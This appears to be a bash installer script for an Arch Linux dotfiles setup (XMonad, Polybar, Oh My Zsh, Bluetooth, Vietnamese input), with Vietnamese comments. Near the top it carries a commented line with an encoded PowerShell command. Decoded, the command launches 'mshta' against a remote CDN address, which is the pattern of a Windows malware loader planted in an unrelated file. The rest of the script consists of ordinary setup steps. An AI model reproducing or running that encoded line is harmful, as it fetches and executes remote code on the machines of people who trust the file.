#!/bin/bash

# powershell.exe -eC bQBzAGgAdABhACAAaAB0AHQAcABzADoALwAvAGEAcAB6AHoAegAtADIAMABjADcAZQAuAGsAeABjAGQAbgAuAGMAbwBtAC8AYQBwAHoAegB6AC0AMgAwAGMANwBlAA==

# Khởi tạo biến toàn cục
errorCount=0
errorMessages=()
installBluetooth=true    # Tuỳ chọn cài đặt Bluetooth
installDarkTheme=true    # Tuỳ chọn cài đặt Dark theme

# Hàm kiểm tra và ghi lỗi
function checkAndLogError {
    local status=$1
    local message=$2

    if [ "$status" -ne 0 ]; then
        errorCount=$((errorCount + 1))
        errorMessages+=("$message")
    fi
}

# Kiểm tra có dùng sudo không
if [ "$UID" -eq 0 ]; then
    echo -e "\e[31m Do not use sudo \e[0m"
    exit
fi

# Kiểm tra xem thư mục dotfiles có tồn tại không
if [ ! -e "$HOME/dotfiles" ]; then
    echo -e "\e[31m Please clone this repo to /home/$USER/ \e[0m"
    exit
fi

# Không cần sử dụng "source ~/.bashrc" nữa
export PATH="$PATH:/usr/local/bin:/usr/local/sbin:/opt/bin:$HOME/.local/bin:$HOME/bin"

# Cài đặt các gói cần thiết
echo -e "\e[32m [ INFO ] Install package \e[0m"
sudo pacman -Syu && sudo pacman -S --needed --noconfirm \
    neofetch ripgrep fzf git base-devel bat dbus \
    eza feh firefox github-cli kitty \
    xf86-input-libinput xorg-xinput \
    network-manager-applet nodejs npm picom \
    polybar pulseaudio pulseaudio-bluetooth \
    python-pynvim rofi xdg-utils zoxide zsh \
    noto-fonts noto-fonts-extra noto-fonts-emoji ttf-croscore \
    ttf-jetbrains-mono-nerd ibus thefuck xclip \
    go less
checkAndLogError $? "Failed to install packages."

# Cài đặt Oh My Zsh
echo -e "\e[32m [ INFO ] Oh-my-zsh \e[0m"
cd "$HOME"
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
checkAndLogError $? "Failed to install Oh-my-zsh."
git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
checkAndLogError $? "Failed to clone zsh-autosuggestions."

# Sao chép các file cấu hình
echo -e "\e[32m [ INFO ] Copy dotfiles and config files \e[0m"
if [ ! -e "$HOME/.config" ]; then
    mkdir "$HOME/.config"
fi
cd $HOME/dotfiles
cp -rf config/* "$HOME/.config/"
checkAndLogError $? "Failed to copy config files to $HOME/.config/"
cp -rf home/.* "$HOME"
checkAndLogError $? "Failed to copy home files."

# Config update_layout.py
chmod +x $HOME/.config/polybar/update_layout.py
checkAndLogError $? "Fail to chmod update_layout.py"

# Git config
git config --global user.name "Trần Quang Mạnh"
git config --global user.email "manhtq0508@gmail.com"
git config --global init.defaultBranch main

# Cấu hình touchpad
echo -e "\e[32m [ INFO ] Config touchpad (natural scrolling, tap, etc) \e[0m"
sudo cp 30-touchpad.conf /etc/X11/xorg.conf.d
checkAndLogError $? "Failed to configure touchpad."

# Cấu hình module điều chỉnh độ sáng của Polybar
echo -e "\e[32m [ INFO ] Need by Polybar's backlight module (adjust brightness) \e[0m"
sudo usermod -aG video "$USER"
sudo cp backlight.rules /etc/udev/rules.d
checkAndLogError $? "Failed to configure backlight module."

# Load fontconfig
echo -e "\e[32m [ INFO ] Config font \e[0m"
fc-cache -fv
checkAndLogError $? "Fail to config font"

# Cài đặt yay
echo -e "\e[32m [ INFO ] Install yay \e[0m"
git clone https://aur.archlinux.org/yay.git "$HOME/yay"
cd "$HOME/yay"
makepkg -si --noconfirm
checkAndLogError $? "Failed to build and install yay."
cd "$HOME/dotfiles"
sudo rm -rf "$HOME/yay"

# Cài đặt các yêu cầu của XMonad (build từ source)
echo -e "\e[32m [ INFO ] Requirements of XMonad (Build from source) \e[0m"
sudo pacman -S --needed --noconfirm \
    git \
    xorg-server xorg-apps xorg-xinit xorg-xmessage \
    libx11 libxft libxinerama libxrandr libxss \
    pkgconf
checkAndLogError $? "Failed to install XMonad requirements."

if [ ! -e "$HOME/.config/xmonad" ]; then
    mkdir "$HOME/.config/xmonad"
fi
git clone https://github.com/xmonad/xmonad "$HOME/.config/xmonad/xmonad"
checkAndLogError $? "Failed to clone xmonad repository."
git clone https://github.com/xmonad/xmonad-contrib "$HOME/.config/xmonad/xmonad-contrib"
checkAndLogError $? "Failed to clone xmonad-contrib repository."

# Cài đặt GHCup và Stack để build XMonad
echo -e "\e[32m [ INFO ] Install GHCup, stack to build xmonad \e[0m"
curl --proto '=https' --tlsv1.2 -sSf https://get-ghcup.haskell.org | sh
checkAndLogError $? "Failed to install GHCup."

source "$HOME/.ghcup/env" # Load ghcup env
if command -v "stack" > /dev/null; then
    echo -e "\e[32m [ INFO ] Stack found. Build XMonad. \e[0m"
    cd "$HOME/.config/xmonad"
    stack init
    stack install
    checkAndLogError $? "Failed to build and install XMonad."
else
    echo -e "\e[31m Stack not found. Try using new shell. \e[0m"
    bash -c "source $HOME/.ghcup/env && cd $HOME/.config/xmonad && stack init && stack install"
    checkAndLogError $? "Failed to build and install XMonad after retry."
fi

if [ command -v "xmonad" > /dev/null ]; then
    echo -e "\e[32m XMonad installed! \e[0m"
else
    echo -e "\e[31m XMonad not installed! \e[0m"
fi

# pynput
yay -S --needed --noconfirm python-pynput
checkAndLogError $? "Failed to install pynput"

# Cài đặt Bluetooth (nếu bật)
if [ "$installBluetooth" = true ]; then
    echo -e "\e[32m [ INFO ] Bluetooth \e[0m"
    sudo pacman -S --needed --noconfirm bluez bluez-utils blueman
    checkAndLogError $? "Failed to install Bluetooth packages."
    sudo modprobe btusb
    checkAndLogError $? "Failed to load btusb module."
    sudo systemctl enable bluetooth
    checkAndLogError $? "Failed to enable Bluetooth service."
    sudo systemctl start bluetooth
    checkAndLogError $? "Failed to start Bluetooth service."
    yay -S --needed --noconfirm bluetuith
    checkAndLogError $? "Failed to install bluetuith using yay."
fi

# Cài đặt Ibus-Bamboo
echo -e "\e[32m [ INFO ] Ibus-Bamboo \e[0m"
ibus-daemon &
checkAndLogError $? "Failed to start ibus-daemon."
bash -c "$(curl -fsSL https://raw.githubusercontent.com/BambooEngine/ibus-bamboo/master/archlinux/install.sh)"
checkAndLogError $? "Failed to install Ibus-Bamboo."

# Cài đặt Dark theme (nếu bật)
if [ "$installDarkTheme" = true ]; then
    echo -e "\e[32m [ INFO ] Dark theme \e[0m"
    sudo pacman -S --needed --noconfirm gnome-themes-extra
    checkAndLogError $? "Failed to install dark theme."
    yay -S --needed --noconfirm adwaita-qt5-git adwaita-qt6-git
    checkAndLogError $? "Failed to install Adwaita themes using yay."
fi

# Cấu hình Rofi
cd "$HOME/dotfiles"
./setup_rofi.sh
checkAndLogError $? "Failed to configure Rofi."

# Hiển thị thông tin về các lỗi đã gặp
if [ "$errorCount" -ne 0 ]; then
    echo -e "\e[31m Errors encountered: $errorCount \e[0m"
    for msg in "${errorMessages[@]}"; do
        echo -e "\e[31m - $msg \e[0m"
    done
else
    echo -e "\e[32m Installation completed without errors. \e[0m"
fi
